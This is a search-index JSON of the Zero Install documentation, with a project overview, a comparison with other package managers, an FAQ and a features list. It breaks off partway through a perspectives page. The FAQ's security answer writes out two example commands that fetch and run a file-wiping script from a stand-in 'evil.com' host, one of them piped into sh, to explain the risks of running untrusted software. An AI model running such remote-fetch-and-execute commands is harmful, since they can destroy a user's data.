{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Zero Install","text":"<p>Zero Install is a decentralised cross-platform software installation system available under the LGPL. It allows software developers to publish programs directly from their own web-sites, while supporting features familiar from centralised distribution repositories such as shared libraries, automatic updates and digital signatures. It is intended to complement, rather than replace, the operating system's package management. 0install packages never interfere with those provided by the distribution.</p> <p>0install does not define a new packaging format; unmodified tarballs or zip archives can be used. Instead, it defines an XML metadata format to describe these packages and the dependencies between them. A single metadata file can be used on multiple platforms (e.g. Ubuntu, Debian, Fedora, openSUSE, Mac OS X and Windows), assuming binary or source archives are available that work on those systems.</p> <p>0install also has some interesting features not often found in traditional package managers. For example, while it will share libraries whenever possible, it can always install multiple versions of a package in parallel when there are conflicting requirements. Installation is always side-effect-free (each package is unpacked to its own directory and will not touch shared directories such as /usr/bin), making it ideal for use with sandboxing technologies and virtualisation.</p> <p>The XML file describing the program's requirements can also be included in a source-code repository, allowing full dependency handling for unreleased developer versions. For example, a user can clone a Git repository and build and test the program, automatically downloading newer versions of libraries where necessary, without interfering with the versions of those libraries installed by their distribution, which continue to be used for other software.</p> <p>Started in 2003, 0install is developed by volunteers from around the world; contributors include Aleksey Lim, Anders F Bj\u00f6rklund, Bastian Eicher, Chris Leick, Daniel Tschan, Dave Abrahams, Frank Richter, Mark Seaborn, Michel Alexandre Salim, Pino Toscano, Rene Lopez, Thomas Leonard, Tim Cuthbertson and Tim Diels.</p> <p>More than one thousand packages are currently available and you can easily publish your own programs. Zero Install itself is available from the official repositories of most Linux distributions (including Arch, Debian, Fedora, Gentoo, Mint, openSUSE and Ubuntu).</p> <p>Get Zero Install</p>"},{"location":"#why-use-0install","title":"Why use 0install?","text":"<p>Click one of the links below to find out why you may want to use 0install.</p> By perspective How 0install benefits users, administrators, developers and distributions. Compared to other systems Why you may prefer 0install over another project. Cool features Some key features: native packager integration, sharing and security. FAQ Frequently Asked Questions"},{"location":"#documentation","title":"Documentation","text":"Getting Started How to use 0install to download and run programs. Details How 0install works. Developers How to contribute to 0install itself, or integrate it with your own software. Packaging How to make software available through 0install. Specifications Formal specifications for the file formats used by 0install.  Tools Programs to make publishing and using 0install programs easier."},{"location":"about/comparison/","title":"Comparison","text":""},{"location":"about/comparison/#matrix","title":"Matrix","text":"<p>This matrix shows some desirable features in a packaging system, and shows which systems provide them. Obviously, these things tend to be a bit biased (both in terms of what features are chosen for comparison, and of what is considered to be a 'pass') but it should give the general idea.</p> Feature Source tarball APT AppImage Chocolatey PortableApps.com Zero Install Non-admins can install software  Yes  No  Yes  Some packages  Yes  Yes Supports multiple platforms  Yes  No (Linux only)  No (Linux only)  No (Windows only)  No (Windows only)  Yes Dependencies handled automatically  No  Yes  Bundled  Yes  Bundled  Yes Automatic upgrading  No  Yes  Some packages  No  Yes  Yes Libraries shared between programs  Yes  Yes  No  Partial  No  Yes Downloads shared between users  No  No user downloads  No  No  No  Yes Multiple versions coexist  Yes  No  Yes  No  Yes  Yes Uninstall  Sometimes  Yes  Yes  Some packages  Yes  Yes (cache) Digital signatures  No  Yes  Yes  Yes  No  Yes Conflict-free  No  No  Yes  No  Yes  Yes Decentralised  Yes  No  Yes  No  No  Yes Non-admin install of system  Yes  No  Yes  No  Yes  Yes Can install systems software  Yes  Yes  No  Yes  No  No Supports sandboxing  No  No  Yes  No  No  Yes Usable when off-line  Yes  Yes  Yes  Yes  Yes  Yes Roam applications across machines  No  No  Manual, app+config  No  Manual, app+config  Automatic, app only Thousands of packages available  Yes  Yes  No  Yes  No  ~1500"},{"location":"about/comparison/#explanation-of-features","title":"Explanation of features","text":"Non-admins can install software A normal user without administrator/root privileges can install software using this system (without unreasonable extra effort). Supports multiple platforms The same package format and command-line works across multiple operating systems, such as Linux and Windows.   Dependencies handled automatically If a program requires some library to function, the system will locate, download and install the library too. Automatic upgrading The system can check for and install upgrades automatically or at the operator's request. User does not have to perform a full install operation manually on each package. Libraries shared between programs If two programs use the same library, the library is only downloaded and stored once. Upgrading a library will benefit all programs that use it. Downloads shared between users If two users install/use the same program, it is only downloaded once and stored once. See Sharing for how to set this up with Zero Install. Multiple versions coexist Two versions of a program or library can be installed at the same time, and the user can choose which one to run. Uninstall Programs can be cleanly removed from the system easily (reversing the effects of the install). Signatures Software comes with a digital signature, which is checked automatically by the system. Conflict-free If program A requires an old version of a library, and program B requires a new version, A and B can both be installed and used at the same time. The system will never refuse to install one program because some other program is installed. Decentralised A program packaged for this system can be installed easily, without having to be in some special centralised repository. Notes: Debian allows extra repositories to be added, but this is a manual step, requires root access, and is a considerable security risk. Non-admin install of system The packaging system itself can be easily installed without administrator/root privileges, and the normal selection of software will be available. Can install systems software The packaging system can be used to install low-level systems software such as device drivers. Supports sandboxing If you have a way of running an application in a sandboxed environment (e.g., a Java virtual machine), then the installation system will let you install and run the program without forcing you to run any of the downloaded code outside of the sandbox. See the EBox sandboxing demo for an example of using 0install in this way. Usable when off-line Once a program has been installed, the program can be run again while disconnected. Roam applications between machines The packaging system makes it easy to roam applications across machines. This may or may not include the application's configuration files. This may or may not require manual effort by the user, such as setting up an external service like Dropbox. Thousands of packages available The system is widely adopted."},{"location":"about/comparison/#by-project","title":"By project","text":""},{"location":"about/comparison/#appimage","title":"AppImage","text":"<p>AppImage is a system for packaging Linux applications into self-contained, single-file executables. Some differences between this and Zero Install:</p> <ul> <li>All dependencies that cannot reasonably be expected to come with all target systems (Linux distributions) in their default installation (\"base system\") are bundled into a single file and can therefore not be shared between apps.</li> <li>Automatic updating is implemented by an additional tool and only supported for AppImages that contain the required metadata. However, unlike Zero Install, it supports delta updates.</li> <li>Only supports Linux.</li> </ul> <p>For projects that do not provide official cross-distribution builds, AppImages are actually good candidates for being published via Zero Install. They can easily be referenced using the <code>&lt;file&gt;</code> retrieval method with <code>executable='true'</code>.</p>"},{"location":"about/comparison/#chocolatey","title":"Chocolatey","text":"<p>Chocolatey is a package manager for Windows. Some differences between this and Zero Install:</p> <ul> <li>Relies on packages to implement reliable install and uninstall logic themselves. Cannot guarantee conflict-free or side-by-side installation.</li> <li>Uses a central, moderated package repository rather than decentralized files on the web.</li> <li>Most packages require administrative permissions for installation.</li> <li>Only supports Windows.</li> </ul> <p>Chocolatey could in future serve the role of the native package manager on Windows. See Distribution integration.</p>"},{"location":"about/comparison/#portableappscom","title":"PortableApps.com","text":"<p>PortableApps.com is a collection of portable applications for Windows. Some differences between this and Zero Install:</p> <ul> <li>All dependencies are bundled and can therefore not be shared between apps.</li> <li>Only supports Windows.</li> </ul> <p>PortableApps write their config in the same directory as the installed applications. This makes them inherently incompatible with Zero Install, since it requires (and enforces) cached implementations to be read-only.</p>"},{"location":"about/comparison/#java-web-start","title":"Java Web Start","text":"<p>Sun have developed a similar system to Zero Install, Java Web Start, although this only works for Java applications and has been deprecated. Microsoft have an equivalent called ClickOnce.</p>"},{"location":"about/comparison/#maven","title":"Maven","text":"<p>Maven is a build tool (like make or ant) for Java programs. Although not an installation system, it is similar to 0install in that each product has a <code>pom.xml</code> file with a list of dependencies. When building a product, Maven downloads the specified version of each dependency and stores it in a cache directory. Some differences between Maven 2.0 and 0install:</p> <ul> <li>The <code>pom.xml</code> files are not signed. An attacker can therefore cause modified POM files to be downloaded.</li> <li>There is no digest of the downloads in the POM file, so no security checks are performed to confirm that the download is OK, and downloads cannot be shared safely between users.</li> <li>Only Java is supported (everything is added to <code>CLASSPATH</code>, nowhere else).</li> <li>Dependencies are named using a simple two-layer system (e.g., axis/axis-jaxrpc). Therefore, a central repository is required to avoid naming conflicts.</li> </ul> <p>Note that you can use Zero Install in a maven-like way for compiling programs. See Easy GTK binary compatibility for an example of using Zero Install to compile a C program against an older version of a library's header files to ensure greater compatibility.</p>"},{"location":"about/comparison/#autopackage-listaller","title":"Autopackage / Listaller","text":"<p>Like Zero Install, Autopackage aims to let users install software and to make software distribution decentralised. The work done by the Autopackage developers to make packages relocatable is necessary for Zero Install too. Some differences between this and Zero Install:</p> <ul> <li>A script inside each package installs the files, making sandboxing difficult. It also makes conversion to other packaging formats troublesome.</li> <li>Security features such as GPG signatures have not been implemented. Given that packages are executable files, the design doesn't seem to allow this to be fixed.</li> <li>Downloads cannot be safely shared between users.</li> <li>No checking for updates or support for multiple versions.</li> <li>Being closer to traditional installation, it's easier to package existing applications with Autopackage.</li> </ul> <p>Note that it is quite possible to list autopackages in a Zero Install feed, as described in this post on the Autopackage mailing list. In this case, no scripts are run during installation (the package is treated as a normal archive), so not all packages will work, but many do.</p> <p>Autopackage is no longer maintained, but has merged with the Listaller project. The Listaller project has also taken over the tools for making relocatable applications, which may be useful for making 0install packages too.</p>"},{"location":"about/comparison/#edos-mancoosi","title":"EDOS / Mancoosi","text":"<p>The EDOS] (Environment for the development and Distribution of Open Source software) project was a research project looking at dependency management, QA, and efficient distribution of large software systems.</p> <p>Mancoosi is a follow-on project (\"Managing the Complexity of the Open Source Infrastructure\"). The group invited me to give a talk (March 2009); here are my notes from the event.</p>"},{"location":"about/comparison/#nix","title":"Nix","text":"<p>Nix is a purely functional package manager. Each version of a package has its own directory. As with Zero Install, \"upgrading\" creates a new directory for the new version, rather than modifying the existing one. Unlike Zero Install, however, whether a package is installed affects the behaviour of the system. For example, running \"firefox\" when Firefox isn't installed produces an error in Nix, whereas in Zero Install it will install Firefox first if missing and then continue. In other words, installation has side-effects in Nix.</p> <p>Additional feeds (e.g. for pre-built binaries) can be registered using <code>nix-channel --add</code>, which appears to work much like <code>0install add-feed</code>, although each channel can contain binaries for multiple packages. The channel <code>MANIFEST</code> file doesn't appear to have a digital signature. Presumably this will be added at some point.</p> <p>Each version of a package has a digest (hash), which includes all build dependencies (e.g. the version of the compiler used), just as it does in Zero Install (for packages built using 0compile, at least).</p> <p>An important difference between the two is that the Nix hash is a hash of the inputs used to build the package, whereas the Zero Install hash is a hash of the resulting binary. Nix does this to support binaries that hard code their own paths, since the final hash needs to be known at compile time. For source (non-compiled) packages, the Nix hash is a hash of the contents, as with Zero Install. The Zero Install hash often happens to include the inputs, since it covers the <code>build-environment.xml</code> file which 0compile places in each binary package. Zero Install doesn't allow binaries to include hard-coded paths.</p> <p>Update: Nix is planning to use binary hashes everywhere in future (zeroing out self-references for the purposes of calculating the hashes). The same thing was proposed a few years ago for Zero Install (the relocation table). It relies on the cache directory being at a fixed location, whereas people often have Zero Install set up to use their home directory, but it's basically a good idea.</p> <p>Another difference between Nix and Zero Install is that Nix treats configurations as packages. Changing your configuration is like \"upgrading\" your configuration package to a new version. Rolling back a change is like reverting to a previous version. Zero Install doesn't generally handle configuration settings, preferring to let the user use subversion (or similar) for that, but it's an interesting idea.</p> <p>Building a Nix package involves creating a \"Nix expression\" in a (custom) functional language. The expression fills the same role as a Zero Install source feed: it says where to download the source, what its digest is, what the build dependencies are, and how to build it.</p> <p>While Zero Install is mainly targeted at adding additional packages to an existing system, Nix aims to manage the whole system (although it installs cleanly alongside your existing package manager). Nix packages have short names (like <code>perl</code>) not full URIs, and thus it appears to assume a centrally-controlled repository.</p> <p>In Nix, mutually untrusting users cannot share packages. The manual says A setuid installation should only by used if the users in the Nix group are mutually trusted, since any user in that group has the ability to change anything in the Nix store. Because the Nix hash is a hash of the inputs, it is not possible for the system to verify that a package is valid (it would have to download the sources and compile the program itself; Nix can share binaries in this case). Because Zero Install hashes are always hashes of the package contents, it does support sharing.</p>"},{"location":"about/comparison/#ostree","title":"OSTree","text":"<p>OSTree describes itself as \"git for operating system binaries\". It shares many goals with 0install (multiple versions of libraries can coexist on one system and you can roll-back easily). While 0install focuses on applications and their libraries, OSTree focuses on the OS itself. However, there is quite a bit of overlap. For example, OSTree considers GTK+ to be an OS library, while 0install might consider it to be an application dependency (which can optionally, of course, be provided by the OS).</p>"},{"location":"about/comparison/#glick-2","title":"Glick 2","text":"<p>Glick 2 has essentially the same goals as 0install, but includes all dependencies in a single bundle rather than linking libraries dynamically at run-time (for example, when a library is updated, every program using that library must be updated individually). It has support for non-relocatable applications, using some Linux-specific tricks. It might be worth using these in 0install to implement the <code>&lt;mount-point&gt;</code> binding, but few applications are non-relocatable these days.</p>"},{"location":"about/comparison/#doapdescription-of-a-project","title":"DOAPDescription of a Project","text":"<p>DOAP is a project to create an XML/RDF vocabulary to describe open source projects. We should investigate whether any of these elements would be useful in Zero Install feed files.</p>"},{"location":"about/comparison/#environment-modules","title":"Environment modules","text":"<p>The Environment Modules package provides for the dynamic modification of a user's environment via modulefiles. Each modulefile contains the information needed to configure the shell for an application. Typically modulefiles instruct the module command to alter or set shell environment variables such as <code>PATH</code>, <code>MANPATH</code>, etc. To be able to load (\"install\") software, it must first be installed under the <code>$MODULESHOME</code> directory which is in <code>/usr/local/Modules</code> or a shared network filesystem. It is also possible to install it in <code>~/.local</code> without root permissions, but then the modules can't be shared (due to different <code>$HOME</code>).</p> <p>The module(1) command doesn't provide a method to share or distribute the applications, so modulefiles typically take advantage of transparent remote network filesystem access such as NFS and AFS. 0install can also be used in this way, with local feeds taking the place of the modulefiles and giving the path of the software on the network file-system rather than a URL from which it can be downloaded.</p> <p>If you believe that any of the information above is inaccurate or out-of-date, please write to mailing list to let us know. Thanks!</p>"},{"location":"about/faq/","title":"Frequently Asked Questions","text":""},{"location":"about/faq/#general-questions","title":"General questions","text":"What is it? <p>Zero Install is a decentralised cross-distribution software installation system. Features include full support for shared libraries (with a SAT solver for dependency resolution), sharing between users, and integration with native platform package managers. It supports both binary and source packages, and works on Linux, OS X, Unix and Windows systems. It is fully Open Source.</p> How many Zero Install packages are there? <p>The public mirror site provides a list of feeds we know about. There are currently more than 2000, although the quality varies.</p> What are \"decentralised\" installation systems, and why are they important? <p>See my essay on OSNews or, if you're in a hurry, just read the summary.</p> Where does it install things to? <p>By default, everything goes under <code>~/.cache/0install.net/</code>. If you enable system-wide sharing, then things go under <code>/var/cache/0install.net/</code> instead. See File locations.</p> <p>If you want to know where a particular program is, you can use <code>0install select</code>, e.g.</p> <pre><code>$ 0install select https://apps.0install.net/gui/vs-code.xml\n- URI: https://apps.0install.net/gui/vs-code.xml\n  Version: 1.52.1\n  Path: /home/me/.cache/0install.net/implementations/sha256new_DRR7SHA2XZ6YP2TLZX2HQF4LX3SGREXXJGCTOSGCV6G74QTU366A    \n\n  - URI: https://apps.0install.net/devel/git.xml\n    Version: 2.27.0-1-1\n    Path: (package:deb:git:2.27.0-1-1:x86_64)\n</code></pre> <p>That said, you shouldn't ever need to know where things are cached. If you're relying on this for some reason, you're probably doing it wrong ;-)</p> Isn't is really hard to run applications if you always have to type URIs for them? <p>Yes. As with the web, that works but it's not the intended way to do it. Like the web, you have links to the URIs, and you use the links normally.</p> <p>For example, you can run <code>0install add</code> to let you run programs quickly from the shell, or AddApp to create graphical launchers, for example.</p> <p>You could put a launcher on the desktop background, set a keyboard shortcut, or add it to your Start menu. A 'distribution' could be nothing more than a web page listing links to high quality software for a particular audience.</p> How do you do integration (e.g., making a Start menu show all installed software)? <p>Since there is no concept of software being 'installed' or 'not-installed', this is not required. The menu (or other launching device) simply shows applications that the user may want to run. They will be fetched on demand.</p> <p>The menu doesn't show installed software; rather, the 'installed' software is what the user has put on the menu. This can be done e.g. using the <code>0desktop</code> command on Linux or the desktop integration feature on Windows.</p> <p>The new menu entry is independent of the program data though; removing the program from the cache doesn't remove the menu item (clicking on it would simply offer to download the program again).</p> Isn't it wasteful for every program to bundle all its dependencies? <p>Yes, but Zero Install doesn't do that. Everything is dynamically linked, just as in a traditional Linux system: you can publish a program on your web-site that links against a library on another web-site. When updates are available for a library, they are used by all programs using that library (except for programs which are incompatible with the new library version, which will continue using the older version, without preventing other programs from upgrading).</p> <p>However, see Export for methods to create such all-in-one bundles for distribution on CD.</p> Why was it called the \"injector\"? <p>The name came from Dependency Injection - see \"The scarily-named Injector\" for details. Now we just call it \"0install\".</p> Wouldn't it be cool if you could install software just by clicking in a web page? <p>It's a bit of a security risk. If you set up your browser to do this, then the author of any random web-site can try to trick you into clicking on some harmless-looking link. They may even be able to trigger the process without any action from you at all. Zero Install's confirmation dialogs should prevent it from actually getting installed, but:</p> <ul> <li>Even with confirmation boxes, web pages can still annoy users by opening thousands of them. You'd need some kind of popup-blocker type technology to stop that.</li> <li>The malicious web page gets to send arbitrary data of their choice to Zero Install. For example, they might try to exploit a buffer-overflow in GnuPG by sending malformed data. Zero Install should reject it, but it's safer if we don't even allow the process to start.</li> <li>If you do this, then your browser needs permission to run arbitrary programs, add items to your Start menu, etc. Given that the browser is one of the most at-risk components on your system, this doesn't sound like a good plan (although browsers are often configured this way at present).</li> </ul> <p>Therefore, we require you to drag the link to the installer to start the process. That way, if you weren't intending to install anything, then the process doesn't even start. As an added bonus, this lets you specify where on your desktop you want the launcher created.</p> <p>That said, if you want this anyway then there's an experimental Firefox Extension to do this.</p> Will Zero Install conflict with my existing package manager? <p>No. Zero Install only writes to its own cache directory. It is completely independent of your existing packaging system. If you install the same program using both systems, you'll get two copies on your system, but they will be kept separate. You can use this to test a newer version of a program without messing up your existing installation.</p> <p>Zero Install can use distribution packages to satisfy some dependencies (rather than downloading a new copy itself). This doesn't affect programs installed using the native packaging system at all. See Distribution Integration for details.</p> <p>Note</p> <p>While installation won't cause problems, actually running a program might change something (for example, a newer version may automatically upgrade a configuration file to a format that the older version can't read). This is essentially the same situation as when you downgrade a package to a previous version using your normal package manager.</p> How do I know you won't start charging for this service? <p>I'm not providing a service. You distribute software by hosting some files on your own web server. The only centralised URLs are the default mirror site and the default GPG key information server, both of which are optional. The core software is all LGPL or GPL.</p> What if something gets automatically removed from the cache while I'm up a mountain with my laptop? <p>Currently, nothing is ever automatically removed from the cache. Users can choose the purging scheme that suits them. For users with broadband, that might mean removing anything that hasn't been accessed for a year. For users with dial-up and 80Gb disks, that probably means never ever removing anything.</p> <p>You can run <code>0install store manage</code> to view the cache and remove versions of programs you don't need anymore:</p> <p></p> <p>You can also just delete things from the <code>~/.cache/0install.net</code> directory directly, but it's easier using the GUI.</p> What happens if there are two programs which may not be run simultaneously for some reason? <p>Running and installing are separate. In Debian, for example, installing some software (eg, exim) may also cause it to run, but in zero install there is no install step, only the running step. So, you can 'install' any number of conflicting packages, but you can still only run one mail system at once.</p> Can upstream authors really be trusted to provide decent quality software? <p>Traditionally, a lot of the QA work that goes on in open source software is done by distributions (such as Debian). They take the `upstream' code from the software authors, and then provide a packaged version to their users. There are then two classes of bugs to worry about:   upstream bugs and packaging bugs. Since it's not usually clear to users which bugs are in which category, they tend to report all bugs to the packagers, who often then fix even upstream bugs in their own packages.</p> <p>The effect of this is that distribution-provided packages are often more reliable than upstream ones (since upstream don't get to hear about many of the bugs), and different distributions have fixed different bugs, with no coordination between them. With Zero Install, bugs get fixed upstream. So, the 'Debian developer' who currently fixes Gimp bugs would still do the same job, but as a 'Gimp developer' instead. Thus, the fixes would benefit everyone, not just Debian users.</p> <p>Of course, the other reason why packages may be different to the upstream versions is because upstream is slow to respond, uninterested, or known to be careless about quality. In this case, a Zero Install packager can provide a fixed version from their own site and get other people to link to that. The advantage here is that, again, everyone benefits, not just users of one distribution.</p> Does this replace <code>/etc</code>, <code>/var</code>, <code>/tmp</code>, etc.? <p>No. Zero Install is read-only, so you couldn't store configuration, data or temporary files in it, even if you wanted to. It replaces <code>/usr</code> and <code>/opt</code>. It's sensible to keep the other things separate, because they need to be treated differently:</p> <code>/etc</code> Contains system configuration. Should be backed up, and probably kept under version control too. May be mounted read-only most of the time. <code>/home</code> User data. Must be writable, and often changes. Should be backed up regularly. <code>/var</code> Changes quickly (contains print and mail queues, logs, etc). Must be writable. Doesn't need to be backed up, but data should persist over reboots. Zero Install cache is stored here; if lost it will just prompt you to download the programs again when you run them. <code>/tmp</code> Changes quickly and must be writable, but need not persist over reboots (can use tmpfs rather than a physical disk). What was the inspiration for Zero Install? <p>Several things. CODA and wwwoffle for showing that caching network filesystems can still work when off-line. The W3C for using URIs for namespaces. Not Java Web Start, Konvalo, D. J. Bernstein's slashpackage or The Open Software Description Format (OSD) though, because I had never heard of them when I started the project.</p> What's the relationship between the <code>0install</code> and <code>0launch</code> commands? <p><code>0launch</code> is older. It was originally intended to be used just for running things, but we ended up adding a load of other options to it (e.g. <code>0launch --import</code>) and it got a bit messy.</p> <p>0install provides a cleaner, newer interface using sub-commands. <code>0launch URI</code> is equivalent to <code>0install run URI</code>. In general, using <code>0launch</code> as anything other than a short form of <code>0install run</code> is deprecated and you should use <code>0install</code> instead.</p>"},{"location":"about/faq/#network-questions","title":"Network questions","text":"Isn't fetching stuff over the web really slow? <p>You have to get stuff over the web anyway the first time. The system caches everything, and you can run the software in future without needing a network connection.</p> Doesn't it require a fast Internet connection? <p>No more than downloading programs from the Internet normally. However, it can still save you some time, since it might only download the documentation for a package when you click on Help, for example. With traditional systems, all the extras have to get installed with the main program because users can't install anything themselves later if they find they need it.</p> What about people without Internet connections? <p>You can use 0export to create a setup.sh self-extracting installation script for distribution on CDs.</p> What about when resources move? <p>Everything you've already accessed at least once will continue to work. Users trying software for the first time will find that it doesn't work due to broken links. This is not new, either. The download instructions for ROX-Filer tell users that they need to get GTK from www.gtk.org and libxml from www.xmlsoft.org. If those sites change their names, the download instructions will be broken. It really doesn't make any difference. As with the regular web, people can leave redirections to the new site.</p> <p>Also, if a feed can't be fetched from its main site, Zero Install will automatically try using a mirror service. Mirror services continue hosting feeds that are no longer available from their original sites.</p> <p>The <code>0install import</code> command lets you import the feed from the new location, and <code>0install store add</code> allows adding any archive to the cache (provided its message digest matches). Because Zero Install simply unpacks an archive when installing a package, anyone with that program cached can re-export it (e.g. using 0export). Because Zero Install digests are over the package archive's contents (not the archive itself), the original GPG signature is still valid (and is also exported by 0export). The digest can also be checked against the one from the mirror server.</p>"},{"location":"about/faq/#security-questions","title":"Security questions","text":"How secure is this? <p>About as secure as any system which ultimately involves running software written by people you don't know who live in far away countries. However, since the downloading is automatic, there are more chances for automatic checking (eg, verifying GPG signatures, etc):</p> <p></p> <p>To be more precise, it has all the advantages of application directories (no install step, so no chance for anything to run as root). In addition, if two users try to run the same application, they both automatically get the same cached copy, whereas without this each would have to install a separate copy to their home directory, or one user has to trust the other user not to have modified his copy, and use that.</p> <p>See the security issues document for more information.</p> Doesn't Zero Install make it easier to send users malicious software? <p>Not really. True, you could email a user, telling them to run:</p> <pre><code>$ 0install run http://evil.com/wipe-my-files\n</code></pre> <p>But on the other hand, you could also send them an email telling them to type:</p> <pre><code>$ lynx -source http://evil.com/wipe-my-files | sh -\n</code></pre> <p>Both can do exactly the same amount of damage, but the second works on any system. If a user is prepared to run unknown software, they're going to do it with or without Zero Install.</p> <p>Zero Install helps with large, complicated programs with lots of dependencies, whereas your typical malicious program is only a few lines long, and doesn't benefit from it.</p> Sometimes, bugs are found (and fixed) in the Linux kernel that allow any user to become root. For example, one was used to compromise some of Debian's servers. Couldn't a user access some software through Zero Install that took advantage of this bug to break an un-patched machine? <p>Well, yes. But, as with the question above, they could do it just as easily without Zero Install (using wget, or just by typing the program in themselves). If your kernel is insecure, you have a problem with or without Zero Install.</p>"},{"location":"about/faq/#developers","title":"Developers","text":"How do I provide software using Zero Install? <p>The main requirement is that the program doesn't use hard-coded paths. It should get resources from its own package relative to its own location (e.g. a shell script would use <code>$(dirname $0)/mydata</code> rather than <code>/usr/share/myprog/mydata</code>). Resources in other packages should be found using environment variables (<code>$GAME_DATA/level1</code> rather than <code>/usr/share/gamedata/level1</code>). Many programs do this already.</p> <p>Once you have suitable binary, upload an archive of it onto your web-site in the normal manner. The most widely understood formats are <code>.tar.gz</code> and <code>.tar.bz2</code>, but Zero Install can also extract from <code>.zip</code> files, and <code>.rpm</code>, <code>.deb</code> and <code>.autopackage</code> packages if the appropriate extraction program is available (<code>unzip</code>, <code>rpm2cpio</code>, etc). Often, you don't need to do anything special for Zero Install and can just use your existing binary release.</p> <p>Finally, you need to write a short XML file describing your program, the versions of it that are available, how to get them, and what libraries they require.</p> <p>See the Packaging Guide for details.</p> How do I install a library? <p>You don't install libraries directly; instead, each program which depends on the library must specify this dependency in its XML feed. In this way, every program sees a version of the library with which it is compatible. The only programs which will \"see\" a 0install library are those programs which specify a dependency on it.</p> <p>Note</p> <p>If the program does specify the dependency, and you just want to make it use a particular version of the library, see the next question...</p> How can I run my own version of something, instead of downloading a released version? <p>Let's say you want to run a Git (developer) version of Edit. Start by cloning Edit's Git repository, as normal:</p> <pre><code>$ git clone git://repo.or.cz/rox-edit.git Edit\n</code></pre> <p>Aside: If you don't have Git, just use Zero Install to get it:</p> <pre><code>$ 0install add git http://0install.net/2008/3rd-party/git.xml\n</code></pre> <p>Now, if you try to run it directly, it will probably complain that it can't find ROX-Lib (a library it needs):</p> <pre><code>$ cd Edit\n$ ./AppRun\n*** This program needs ROX-Lib2 (version 1.19.14) to run.\n</code></pre> <p>The required libraries are listed in the <code>Edit.xml</code> file, and you can run that using <code>0install run</code>:</p> <pre><code>$ 0install run Edit.xml\n[ edit runs ]\n</code></pre> <p>Of course, you could do <code>0install add edit-git Edit.xml</code> to make a command that runs this version easily.</p> How can I register my own version under the original's URI? <p>The answer to the last question showed how to run a local version of a program directly, using 0install to fetch the libraries it needed. However, if you (or some other program) run Edit using the normal URI (<code>http://rox.sourceforge.net/2005/interfaces/Edit</code>), your version won't show up. To add it, use <code>0install add-feed</code>:</p> <pre><code>$ cd Edit\n$ 0install add-feed Edit.xml\nFeed 'Edit.xml':\n1) Add as feed for 'http://rox.sourceforge.net/2005/interfaces/Edit'\n\nEnter a number, or CTRL-C to cancel [1]:\n\nFeed list for interface 'http://rox.sourceforge.net/2005/interfaces/Edit' is now:\n- /home/talex/rox/Edit/Edit.xml\n$ 0install select -g http://rox.sourceforge.net/2005/interfaces/Edit\n</code></pre> <p>When the GUI opens, you should see your local feed listed:</p> <p></p> <p>The new version will appear in the list of available versions, and will be selected if it's the newest one (which a fresh subversion checkout should be - the version normally ends in <code>-post</code> to indicate that it is not a released version):</p> <p></p> <p>This is particularly useful for libraries, since they are always used by other programs rather than run directly.</p> Is Linux binary compatibility good enough to share binaries between distributions? <p>There are some problems in this area generally (not just with Zero Install). However, we have binaries for ROX-Filer and many other programs that work on all distributions, so it's certainly possible. Zero Install can help you create more compatible binaries by compiling against older versions of header files; see Easy GTK binary compatibility for an example.</p>"},{"location":"about/features/","title":"Features","text":"Decentralised; anyone can distribute software <p>The traditional Linux distribution system, using centralised repositories, creates an interesting chicken-and-egg situation: distributions won't package software until it becomes popular, but software won't become popular until it's easy to install.</p> <p>You don't need to be blessed by a distribution (or anyone else) to be part of 0install; all you need is a web page.</p> <p>It's easier too: you can make a single archive that works on all platforms (for platform-independent applications such as Python or Java programs), or have 0install download the correct archive automatically (for platform-specific binaries).</p> <p>See the \"Decentralised Installation Systems\" essay on OSNews for a more complete introduction to the subject.</p> <p>See the Packaging Guide for information on distributing software using 0install.</p> Security is central <p>Security is sometimes seen as the enemy of usability, but we see it as the foundation of a usable system. Good security doesn't just mean not having your data destroyed by viruses - it means freedom to experiment with new software.</p> <p>The problems with a centrally-controlled \"app store\" as the only means to get software are clear to everyone: applications that compete with the store owner's interests are banned. Innovation and competition suffer. But the same effect can be achieved without overt restrictions if getting software from outside the distribution repository is simply too risky for users to consider.</p> <p>See the security page for more information about 0install's security features.</p> You control your own computer <p>When you install a package with a traditional installer, you have no way of knowing what it will do. Will it add itself to a menu somewhere? Start a service whenever you turn on the computer? Stop another program from working?</p> <p>0install merely caches programs, each version of each package in its own directory. Changes to the environment, such as adding a menu entry, only happen in response to a deliberate action on your part.</p> Conflict free <p>If two programs want the same version of a library, they'll share it. Otherwise, they'll use separate copies.</p> <p>You're free to try the very latest development version of a program (along with all the bleeding-edge libraries it needs) without destabilising the rest of your system. And you can always revert back to an older version... or run old and new versions of the same program side-by-side!</p> Shared binaries/cache <p>0install supports sharing of binaries (the implementation cache) between users and between virtual machines.</p> <p>If one user installs a 200 Mb application, another user can run it without downloading it again. Most packaging systems solve this problem by only allowing root to install software. The systems which don't have this limitation typically end up downloading and storing multiple copies of a program; one for each user. 0install shares downloads (safely) between users.</p> <p>With 0install, each user downloads a small feed file which gives the cryptographic digest of the full package. The digest can be used to check that a package already on the computer (downloaded by another user) hasn't been tampered with. Most simply, each user can make a copy of the original download this way (which shares the download but not the disk space). With a special helper, even the disk copies can be safely shared.</p> Cross-Platform and Cross-Distribution <p>A single 0install package can be used across multiple Linux distributions, OS X, Unix and Windows systems (given that the packaged application itself is written to be cross-platform as well).</p> Automatic updates <p>When you run a program and it has been a month since the last check, 0install will quietly check for updates in the background. If any are available, you will be notified.</p> <p>The frequency of these checks is configurable, and you can choose not to use the latest version if you prefer.</p> Binary and source packages <p>0install supports both compiling applications from source and downloading binaries.</p> Native package manager integration <p>If you have already installed a package using your distribution's installer then 0install can use that instead of downloading a second copy.</p> <p>It can also use use PackageKit to install system packages using the distribution's package manager, if no 0install package is available.</p> <p>See the distro integration page for more information.</p> Run without granting root privileges <p>When installing a package, most installation systems execute pre- and post-install scripts inside the package as root, giving the package full access to your machine. Even if they didn't, the fact that the package can unpack files to directories such as <code>/usr/bin</code> or <code>/usr/lib</code> effectively gives them root access anyway.</p> <p>By contrast, when 0install installs (caches) a package, it does not run any code from the package and it does not write to any of the traditional software directories like <code>/usr/bin</code> or <code>/usr/lib</code>. Instead it simply puts each unpacked archive into its own directory.</p> Run without being root <p>Since installing software with 0install does not allow it to affect the system as a whole, there is no need to restrict it to users with root privileges. Therefore, there is no need to give users root privileges just so that they can install software.</p>"},{"location":"about/perspectives/","title":"Perspectives","text":"<p>Depending on who you are, you'll be interested in different aspects of Zero Install. Choose the type below that most closely describes you:</p> <ul> <li>Novice user</li> <li>Power user</li> <li>System administrator</li> <li>Software 